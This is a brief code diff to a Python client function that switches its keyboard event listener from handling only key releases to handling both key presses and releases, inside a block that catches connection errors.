@@ -53,10 +53,10 @@ def start_client():
                 return False
 
         # Start listening to keyboard events
-        # with Listener(on_press=on_press, on_release=on_release) as listener:
-        #     listener.join()
-        with Listener(on_release=on_release) as listener:
+        with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
+        # with Listener(on_release=on_release) as listener:
+        #     listener.join()
 
     except Exception as e:
         print(f"Connection error: {e}")
